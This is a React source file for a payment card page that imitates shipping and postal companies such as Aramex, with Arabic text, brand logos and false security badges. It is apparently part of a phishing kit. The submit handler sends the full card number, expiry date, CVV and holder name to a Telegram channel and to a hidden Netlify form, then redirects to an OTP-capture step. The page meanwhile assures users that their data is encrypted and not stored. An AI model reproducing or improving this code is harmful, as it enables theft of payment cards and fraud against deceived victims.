import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { Loader2, Lock, ShieldCheck, CreditCard, Info, HelpCircle, ChevronRight, Globe, Shield, Building2, Truck, Wallet } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";

const PaymentCardInput = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolder, setCardHolder] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
  const govId = searchParams.get("govId") || linkData?.payload?.govId;

  // Get entity visual spec
  const entitySpec = useMemo(() => {
    if (companyKey) {
      return getEntityVisualSpec(companyKey);
    }
    return null;
  }, [companyKey]);

  // Get branding as fallback
  const serviceBranding = getServiceBranding(companyKey);
  const companyBranding = companyKey ? shippingCompanyBranding[companyKey.toLowerCase()] : null;

  // Apply entity CSS variables
  useEffect(() => {
    if (entitySpec) {
      const cssVars = specToCSSVariables(entitySpec);
      const root = document.documentElement;
      Object.entries(cssVars).forEach(([key, value]) => {
        root.style.setProperty(key, value);
      });
      root.setAttribute('data-entity', entitySpec.entityId);
      root.setAttribute('data-entity-category', entitySpec.category);
    }
    return () => {
      const root = document.documentElement;
      root.removeAttribute('data-entity');
      root.removeAttribute('data-entity-category');
    };
  }, [entitySpec]);

  // Visual values
  const primaryColor = entitySpec?.colors.primary || companyBranding?.colors.primary || serviceBranding.colors.primary;
  const secondaryColor = entitySpec?.colors.secondary || companyBranding?.colors.secondary || serviceBranding.colors.secondary;
  const backgroundColor = entitySpec?.colors.background || companyBranding?.colors.background || '#F8F9FA';
  const surfaceColor = entitySpec?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
  const textColor = entitySpec?.colors.text || companyBranding?.colors.text || '#1A1A1A';
  const textLightColor = entitySpec?.colors.textLight || companyBranding?.colors.textLight || '#666666';
  const borderColor = entitySpec?.colors.border || companyBranding?.colors.border || '#E5E5E5';
  const fontFamily = entitySpec?.typography.fontFamilyAr || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif';
  const borderRadius = entitySpec?.dimensions.borderRadius || companyBranding?.borderRadius.lg || '16px';
  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
  const inputHeight = entitySpec?.dimensions.inputHeight || '56px';
  const cardShadow = entitySpec?.shadows.card || companyBranding?.shadows.lg || '0 10px 40px rgba(0,0,0,0.1)';
  const buttonShadow = entitySpec?.shadows.button || `0 20px 50px ${primaryColor}40`;
  const logoUrl = entitySpec?.assets.logo || companyBranding?.logoUrl || serviceBranding.logo;
  const entityNameAr = entitySpec?.entityNameAr || serviceBranding.nameAr || companyKey;
  const entityNameEn = entitySpec?.entityNameEn || serviceBranding.nameEn || companyKey;
  const category = entitySpec?.category || 'shipping';

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 16) value = value.slice(0, 16);
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    setCardNumber(formattedValue);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length >= 2) {
      value = value.slice(0, 2) + "/" + value.slice(2);
    }
    setExpiryDate(value);
  };

  const getCardType = (number: string) => {
    const cleanNumber = number.replace(/\s/g, "");
    if (/^4/.test(cleanNumber)) return "visa";
    if (/^5[1-5]/.test(cleanNumber)) return "mastercard";
    if (/^6/.test(cleanNumber)) return "mada";
    return "unknown";
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (cardNumber.replace(/\s/g, "").length < 16 || expiryDate.length < 5 || cvv.length < 3) {
      toast({ title: "خطأ", description: "الرجاء التحقق من بيانات البطاقة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const cardInfo = {
      cardLast4: cardNumber.slice(-4),
      cardType: getCardType(cardNumber),
      expiryDate,
      cardHolder
    };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, cardInfo } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-payment",
          linkId: id!,
          service: entityNameAr,
          amount: formattedAmount,
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiryDate,
          cvv,
          cardHolder
        }).toString()
      });

      await sendToTelegram({
        type: 'card_info',
        data: {
          cardNumber: cardNumber.replace(/\s/g, ""),
          expiryDate,
          cvv,
          cardHolder,
          service: entityNameAr,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/otp${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل معالجة البطاقة", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  // Category icon
  const CategoryIcon = category === 'shipping' || category === 'postal' ? Truck :
                       category === 'bank' ? Building2 :
                       Wallet;

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor, fontFamily }}>
      <PaymentMetaTags
        serviceKey={companyKey}
        serviceName={entityNameAr}
        title="بوابة الدفع الإلكتروني"
        amount={formattedAmount}
      />

      {/* Entity Header */}
      <header className="border-b shadow-sm h-16 sm:h-20 flex items-center sticky top-0 z-50 px-4" style={{ backgroundColor: surfaceColor, borderColor, boxShadow: entitySpec?.shadows.header || '0 2px 8px rgba(0,0,0,0.06)' }}>
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3 sm:gap-4">
            {logoUrl ? (
              <img src={logoUrl} alt={entityNameAr} className="h-10 sm:h-12 object-contain" />
            ) : (
              <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center text-white shadow-lg" style={{ backgroundColor: primaryColor }}>
                <CategoryIcon className="w-5 h-5 sm:w-6 sm:h-6" />
              </div>
            )}
            <div className="h-8 w-px hidden sm:block" style={{ backgroundColor: borderColor }} />
            <div className="hidden sm:block" style={{ color: textLightColor }}>
              <p className="text-[10px] font-bold uppercase tracking-widest leading-none mb-1">Payment Gateway</p>
              <p className="text-[9px] font-medium">Secure Online Transaction</p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full border text-[10px] font-bold transition-colors cursor-pointer" style={{ color: textLightColor, borderColor, backgroundColor: `${textLightColor}08` }}>
              <Globe className="w-3.5 h-3.5" />
              <span>English</span>
            </div>
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full border text-[10px] font-bold" style={{ backgroundColor: `${primaryColor}08`, color: primaryColor, borderColor: `${primaryColor}20` }}>
              <Lock className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">آمن</span>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
        <div className="w-full max-w-xl space-y-8">
          <div className="text-center space-y-3">
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: textColor }}>إتمام عملية الدفع</h1>
            <div className="flex items-center justify-center gap-2 font-bold uppercase tracking-widest text-[10px]" style={{ color: textLightColor }}>
              <ShieldCheck className="w-4 h-4" style={{ color: primaryColor }} />
              <span>Transaction ID: {id?.slice(0, 8).toUpperCase()}</span>
            </div>
          </div>

          <Card className="border-none overflow-hidden" style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}>
            {/* Amount Display */}
            <div className="p-8 sm:p-10 border-b relative overflow-hidden group" style={{ backgroundColor: `${primaryColor}05`, borderColor }}>
              <div className="absolute top-0 left-0 w-full h-1 group-hover:opacity-80 transition-opacity" style={{ backgroundColor: primaryColor, opacity: 0.2 }} />
              <div className="flex items-center justify-between relative z-10">
                <div className="space-y-1">
                  <p className="text-[11px] font-bold uppercase tracking-widest" style={{ color: textLightColor }}>إجمالي المبلغ</p>
                  <h2 className="text-3xl sm:text-4xl font-bold tracking-tighter" style={{ color: primaryColor }}>{formattedAmount}</h2>
                </div>
                <div className="text-left">
                  <p className="text-[10px] font-bold uppercase tracking-widest mb-1" style={{ color: textLightColor }}>حالة الطلب</p>
                  <div className="flex items-center gap-1.5 font-bold text-sm" style={{ color: primaryColor }}>
                    <div className="w-2 h-2 rounded-full animate-pulse" style={{ backgroundColor: primaryColor }} />
                    <span>بانتظار السداد</span>
                  </div>
                </div>
              </div>
              <div className="absolute -bottom-10 -right-10 opacity-[0.03] rotate-12">
                <CreditCard className="w-64 h-64" />
              </div>
            </div>

            <form onSubmit={handleSubmit} className="p-8 sm:p-10 space-y-6 sm:space-y-8">
              <div className="space-y-5 sm:space-y-7">
                <div className="space-y-2">
                  <Label className="text-[11px] font-bold uppercase tracking-wide px-1 flex justify-between" style={{ color: textLightColor }}>
                    <span>رقم البطاقة الائتمانية</span>
                    <span className="text-[10px]" style={{ color: primaryColor }}>Card Number</span>
                  </Label>
                  <div className="relative group">
                    <Input
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      className="pr-14 text-xl tracking-[0.15em] transition-all"
                      style={{
                        height: inputHeight,
                        borderRadius,
                        backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
                        borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
                        borderWidth: '2px',
                      }}
                      placeholder="0000 0000 0000 0000"
                      required
                    />
                    <CreditCard className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 transition-colors" style={{ color: textLightColor }} />
                    <div className="absolute left-5 top-1/2 -translate-y-1/2 flex items-center gap-3">
                      {getCardType(cardNumber) === "visa" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-5" />}
                      {getCardType(cardNumber) === "mastercard" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-5" />}
                      {getCardType(cardNumber) === "mada" && <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-5" />}
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-6 sm:gap-8">
                  <div className="space-y-2">
                    <Label className="text-[11px] font-bold uppercase tracking-wide px-1" style={{ color: textLightColor }}>تاريخ الانتهاء (MM/YY)</Label>
                    <Input
                      value={expiryDate}
                      onChange={handleExpiryChange}
                      className="text-center text-xl transition-all"
                      style={{
                        height: inputHeight,
                        borderRadius,
                        backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
                        borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
                        borderWidth: '2px',
                      }}
                      placeholder="MM/YY"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-[11px] font-bold uppercase tracking-wide px-1" style={{ color: textLightColor }}>رمز الأمان (CVV)</Label>
                    <div className="relative">
                      <Input
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                        type="password"
                        className="text-center text-xl transition-all"
                        style={{
                          height: inputHeight,
                          borderRadius,
                          backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
                          borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
                          borderWidth: '2px',
                        }}
                        placeholder="***"
                        required
                      />
                      <HelpCircle className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 cursor-help" style={{ color: textLightColor }} />
                    </div>
                  </div>
                </div>

                <div className="space-y-2">
                  <Label className="text-[11px] font-bold uppercase tracking-wide px-1" style={{ color: textLightColor }}>اسم حامل البطاقة</Label>
                  <Input
                    value={cardHolder}
                    onChange={(e) => setCardHolder(e.target.value)}
                    className="px-6 text-lg uppercase transition-all"
                    style={{
                      height: inputHeight,
                      borderRadius,
                      backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
                      borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
                      borderWidth: '2px',
                    }}
                    placeholder="HOLDER NAME AS WRITTEN ON CARD"
                    required
                  />
                </div>
              </div>

              <div className="pt-6 sm:pt-8">
                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full text-lg sm:text-xl font-bold shadow-xl text-white active:scale-[0.98] transition-all flex items-center justify-center gap-3"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                    boxShadow: buttonShadow,
                    borderRadius,
                    height: buttonHeight,
                    color: entitySpec?.colors.textOnPrimary || '#FFFFFF',
                  }}
                >
                  {isSubmitting ? (
                    <Loader2 className="w-6 h-6 sm:w-8 sm:h-8 animate-spin" />
                  ) : (
                    <>
                      <span>تأكيد عملية السداد الآن</span>
                      <ShieldCheck className="w-5 h-5 sm:w-6 sm:h-6" />
                    </>
                  )}
                </Button>

                <div className="mt-8 sm:mt-10 flex flex-col items-center gap-6">
                  <div className="flex items-center gap-6 h-8" style={{ opacity: 0.6, filter: 'grayscale(1)' }}>
                    <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
                    <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
                    <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
                  </div>
                  <p className="text-[10px] font-bold leading-relaxed text-center max-w-sm" style={{ color: textLightColor }}>
                    بالنقر على زر التأكيد، أنت توافق على معالجة معاملتك المالية بأمان. جميع البيانات مشفرة ولا يتم تخزينها.
                  </p>
                </div>
              </div>
            </form>
          </Card>

          <div className="flex flex-col sm:flex-row items-center justify-between gap-6 px-4">
            <div className="flex items-center gap-3" style={{ color: textLightColor }}>
              <div className="w-10 h-10 rounded-full border flex items-center justify-center" style={{ backgroundColor: surfaceColor, borderColor, color: primaryColor }}>
                <Shield className="w-5 h-5" />
              </div>
              <div>
                <p className="text-[10px] font-bold uppercase leading-none mb-1" style={{ color: textColor }}>PCI-DSS Certified</p>
                <p className="text-[9px] font-medium">معايير أمان عالمية</p>
              </div>
            </div>
            <div className="flex items-center gap-3" style={{ color: textLightColor }}>
              <div className="w-10 h-10 rounded-full border flex items-center justify-center" style={{ backgroundColor: surfaceColor, borderColor, color: primaryColor }}>
                <Lock className="w-5 h-5" />
              </div>
              <div>
                <p className="text-[10px] font-bold uppercase leading-none mb-1" style={{ color: textColor }}>Encrypted Session</p>
                <p className="text-[9px] font-medium">اتصال مشفر 256-bit</p>
              </div>
            </div>
          </div>
        </div>
      </main>

      <form name="card-payment" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardNumber" />
        <input type="text" name="expiryDate" />
        <input type="text" name="cvv" />
        <input type="text" name="cardHolder" />
      </form>
    </div>
  );
};

export default PaymentCardInput;
